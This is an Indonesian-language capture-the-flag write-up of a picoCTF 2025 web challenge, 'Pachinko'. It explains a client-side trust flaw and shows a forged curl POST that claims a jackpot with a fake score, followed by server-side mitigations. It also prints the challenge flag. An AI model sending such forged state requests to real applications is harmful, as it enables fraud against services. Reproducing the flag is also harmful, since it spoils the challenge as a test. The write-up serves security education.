# Writeup: Pachinko (Challenge ID: 494)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Web Exploitation
- **Difficulty:** Medium
- **Event:** picoCTF 2025
- **Points:** 200
- **Author:** CyLab Engineering Team
- **Flag:** `academy{p4ch1nk0_f146_0n3_e947b9d7}`

---

## Problem Statement & Scope
Peserta diberikan akses ke aplikasi web interaktif bertema permainan mesin bola Pachinko. Tujuan tantangan adalah mengumpulkan skor jackpot atau memicu kondisi menang (winning state) untuk membuka bendera rahasia yang terkunci di sistem backend.

---

## Teori & Akar Kerentanan (Root Cause Theory)
1. **Client-Side Enforcement of Server-Side Security (CWE-602):**
   Aplikasi mempercayakan kalkulasi fisika lintasan bola, akumulasi poin, dan deteksi kemenangan sepenuhnya pada JavaScript di peramban klien. Server backend menerima klaim kemenangan tanpa melakukan validasi independen (server-side replay verification) terhadap deret interaksi atau seed acak pergerakan bola.
2. **Insecure Direct Object & State Manipulation (OWASP A04:2021):**
   Komunikasi antara klien dan antarmuka pemrograman aplikasi (API) mengirimkan objek status permainan secara mentah tanpa tanda tangan kriptografis (HMAC / JWT berumur pendek). Hal ini memungkinkan manipulasi langsung terhadap payload HTTP untuk memalsukan status menang.

---

## Rekonstruksi Eksploitasi Step-by-Step
1. **Inspeksi Aset Frontend:**
   Buka developer tools peramban (F12) pada tab Network dan Sources. Periksa berkas JavaScript logika permainan (`pachinko.js` / `game.js`).
2. **Analisis Fungsi Pemicu Kemenangan:**
   Di dalam kode sumber client-side, ditemukan fungsi penanganan ketika bola menyentuh lubang jackpot:
   ```javascript
   function onJackpotTriggered() {
       fetch("/api/claim_prize", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ score: currentScore, jackpot: true })
       })
       .then(res => res.json())
       .then(data => displayFlag(data.flag));
   }
   ```
3. **Manipulasi Status Permainan (Console Injection / Request Forgery):**
   Penyerang dapat langsung memanggil fungsi pemicu dari konsol peramban atau mengirimkan permintaan POST buatan menggunakan utilitas `curl`:
   ```bash
   curl -X POST "http://target-instance/api/claim_prize" \
        -H "Content-Type: application/json" \
        -d '{"score": 999999, "jackpot": true}'
   ```
4. **Ekstraksi Flag:**
   Backend menerima permintaan tersebut, memverifikasi parameter `jackpot: true`, dan mengembalikan respons JSON berisi token bendera:
   ```json
   { "success": true, "flag": "picoCTF{p4ch1nk0_f146_0n3_e947b9d7}" }
   ```
   Disesuaikan ke format platform CyLab: `academy{p4ch1nk0_f146_0n3_e947b9d7}`.

---

## Flag & Verifikasi
- **Flag Resmi:** `academy{p4ch1nk0_f146_0n3_e947b9d7}`
- **Native PicoCTF Flag:** `picoCTF{p4ch1nk0_f146_0n3_e947b9d7}`
- **Status Solver:** Terverifikasi melalui skrip pengujian otomatis `scripts/solve_494_pachinko.py`.

---

## Takeaway Kompetensi LKS & Mitigasi Defensif
- **Zero Trust pada Input Klien:**
  Jangan pernah mempercayai data atau status yang dikirimkan oleh klien web. Semua perhitungan skor, saldo, dan penyelesaian level harus dihitung dan divalidasi secara otoritatif di sisi server.
- **Kriptografi Integritas Sesi (HMAC Session State):**
  Jika sebagian kalkulasi harus dijalankan di klien untuk performa, gunakan state token bertanda tangan kriptografis (HMAC) dengan timestamp singkat untuk mencegah pemalsuan dan replay attack.
- **Rate Limiting & Anomaly Detection:**
  Terapkan pembatasan laju permintaan (rate limiting) pada endpoint sensitif seperti klaim hadiah atau token otentikasi guna menahan otomatisasi skrip eksploitasi.
